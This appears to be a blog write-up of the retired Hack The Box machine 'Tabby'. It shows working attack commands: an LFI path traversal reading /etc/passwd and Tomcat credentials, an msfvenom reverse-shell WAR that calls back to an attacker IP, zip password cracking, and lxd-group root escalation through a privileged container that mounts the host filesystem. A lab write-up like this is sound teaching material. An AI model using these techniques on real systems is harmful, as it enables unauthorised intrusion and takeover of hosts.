---
layout: post
title: "Mount the World"
subtitle: "HTB Tabby — an LFI leaks Tomcat, a WAR file opens the door, and the lxd group hands you the entire disk"
date: 2020-11-14 12:00:00 +0000
description: "Tabby is a clean easy box with one big idea at the end: if you're in the lxd group, you don't escalate to root — you build a container, mount the host's whole filesystem inside it, and walk in as root through the side you built yourself."
image: /assets/og/mount-the-world.png
tags: [hackthebox, tomcat, lxd, linux, privesc, writeup]
---

Tabby is an easy box that ends on an idea bigger than its rating. The front half is honest work — a file-include bug that leaks a password, a Tomcat manager that takes a malicious app, a zip you crack on the way through. Standard. Then the last move turns the whole concept of "root" inside out: you don't break into root's house. You're handed a group membership that lets you *build a new house, mount the old one inside it as a closet,* and stroll out through the door you just framed. The container is the exploit. The host never gets attacked at all.

```
        T A B B Y
        =========
        news.php?file=../../../  →  leaks tomcat's password
                   |
        manager  →  upload a .war  →  shell as tomcat
                   |
        lxd group  →  build a box  →  mount / inside it
                   |
                   v
        you didn't break into root.
        you built a room and pulled the host in after you.
                                            箱
```

## 0x01 · two doors, one host

Three ports. SSH, Apache on 80, and Tomcat on 8080 — the box name was never subtle.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))   Mega Hosting
8080/tcp open  http    Apache Tomcat
```

The site on 80 is a hosting company. Most links are dead, but one points at `http://megahosting.htb/news.php?file=statement`. A `file=` parameter that loads a file is the oldest tell in the book. Add `megahosting.htb` to `/etc/hosts` so the vhost resolves, and start pulling on that thread.

## 0x02 · the include that reads too much

`news.php?file=` does exactly what the name promises — it `fopen`s whatever you hand it, with no leash. It's a butler told *go fetch the file I name and read it out loud.* Nobody told him the file has to be in the library — so you point him at the house safe and he reads you the combination. Walk it out of the web root:

```
http://megahosting.htb/news.php?file=../../../../etc/passwd
```

`/etc/passwd` comes back. Confirmed local file include. Now the question is *what's worth reading.* The Tomcat page on 8080 helpfully tells you where its users are defined, but the obvious path comes back empty — Tomcat 9 on Ubuntu lives somewhere non-default. `find` on a local install points the way, and the LFI reads it:

```
# curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
<user username="tomcat" password="$3cureP4s5w0rd123!"
      roles="admin-gui,manager-script"/>
```

Tomcat creds, in cleartext, read through a hole in a different webapp on a different port. The two doors were never separate.

## 0x03 · the WAR nobody checks

Those creds are missing `manager-gui`, so the pretty web UI slams the door. But the `tomcat` user *does* have `manager-script` — access to the text-only deploy API at `/manager/text`. The GUI was never the point. Tomcat will happily deploy a packaged web app (`.war`) over a plain HTTP PUT, and a `.war` is just a zip with a servlet inside. `msfvenom` builds one that calls home:

```
# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=443 -f war -o rev.war
# curl -u 'tomcat:$3cureP4s5w0rd123!' \
    http://10.10.10.194:8080/manager/text/deploy?path=/iceberg --upload-file rev.war
OK - Deployed application at context path [/iceberg]
```

Hit the path, catch the shell:

```
# nc -lnvp 443
Connection from 10.10.10.194
id  →  uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

A web server that lets an authenticated user upload and run arbitrary code is not a vulnerability — it's the manager API doing its literal job. The vulnerability was leaking the password to someone who was never supposed to hold it.

## 0x04 · the backup that reused the key

In the web root sits a password-protected backup, `16162020_backup.zip`, owned by a user named `ash`. Exfil it, and let `zip2john` and `john` chew the archive password:

```
# zip2john 16162020_backup.zip > backup.john
# john backup.john --wordlist=rockyou.txt
admin@it         (16162020_backup.zip)
```

The archive contents turn out to be nothing — but the password is the whole prize, because `ash` reused it for his actual account:

```
tomcat@tabby:~$ su - ash
Password: admin@it
ash@tabby:~$ cat user.txt
```

The zip was never the treasure. It was a password oracle wearing a backup costume.

## 0x05 · mount the world

`id` is the first thing you run, and on Tabby it's the last thing you need:

```
ash@tabby:~$ id
uid=1000(ash) ... groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

`lxd`. That group is a root shell with extra steps. lxd is a container manager, and crucially, **the daemon it talks to runs as root.** You never need a vulnerability — you just ask that root daemon, very politely, to do root things on your behalf. Picture being handed a permit to build a shed in the yard — harmless, except the worker who builds it for you is the mayor, and you're allowed to tell him to wall your shed right onto the side of the main house. You frame one door, he builds it as root, and it opens into every room.

The plan: bring a tiny container image to the box, start it as a *privileged* container, and mount the host's entire root filesystem inside it. Inside the container you're root, and the host's `/` is just a folder you can write to.

Build a featherweight Alpine image, push it over, and import it:

```
ash@tabby:/dev/shm$ lxc image import alpine.tar.gz --alias pwn
ash@tabby:/dev/shm$ lxd init   # accept every default
```

Now the move that matters — create the container privileged, and bolt the host's `/` into it as a disk device:

```
ash@tabby:/dev/shm$ lxc init pwn escape -c security.privileged=true
ash@tabby:/dev/shm$ lxc config device add escape host-root disk source=/ path=/mnt/root
ash@tabby:/dev/shm$ lxc start escape
ash@tabby:/dev/shm$ lxc exec escape /bin/sh
~ # id
uid=0(root) gid=0(root)
```

Root — inside the container. But the container's `/mnt/root` *is the host's `/`*, owned and writable by container-root, which the kernel treats as real root for files on that mount:

```
~ # cat /mnt/root/root/root.txt
████████████████████████████████
```

Flag's already yours. For a real shell on the host instead of a peek, flip the host's `bash` to SUID from inside the container and run it back outside:

```
~ # chmod 4755 /mnt/root/bin/bash
ash@tabby:~$ bash -p
bash-5.0# id
uid=1000(ash) euid=0(root) groups=...
```

`euid=0`. You never touched a root process on the host. You built a room where you were already root, dragged the host's disk into it, and let the kernel agree with you.

## 0x06 · the honest caveat

The `lxd` privesc gets filed under "misconfiguration," and that label undersells how *designed* it is. Nothing here is broken. The lxd daemon running as root is how lxd works. Privileged containers mounting host paths is a feature people use on purpose every day. The only mistake on Tabby is a single line in `/etc/group` — `ash` in `lxd` — and that line was probably added by someone who thought "let the dev manage containers" was a small, friendly permission.

It is not a small permission. "Can manage containers" and "is root" are the same sentence on any box where the container daemon runs as root and can mount the host. The same shape shows up everywhere once you start looking: `docker` group is root, `disk` group is root, a `sudo` entry for one "harmless" binary with a shell escape is root. Linux is full of groups that read like middle management and function like the CEO. The takeaway isn't "patch lxd" — there's nothing to patch. It's that **you have to audit group membership like it's a list of people with root**, because on a bad day, it is.

## 0x07 · outro

```
a file param that read the wrong files.
a manager that ran the app you handed it.
a backup whose only secret was its own password.
a group that let you build a box and pour the host inside.

nothing here was unpatched. the door was the design.
you didn't escalate to root. you mounted the world and root came along.

read the param. crack the zip. audit the groups. wear black.

                                                            EOF
```

---

*HTB: Tabby — retired 14 Nov 2020. an easy Linux box that doubles as the cleanest lxd-group lesson on the platform. the container trick still works anywhere a human got dropped in the lxd group "just to help."*
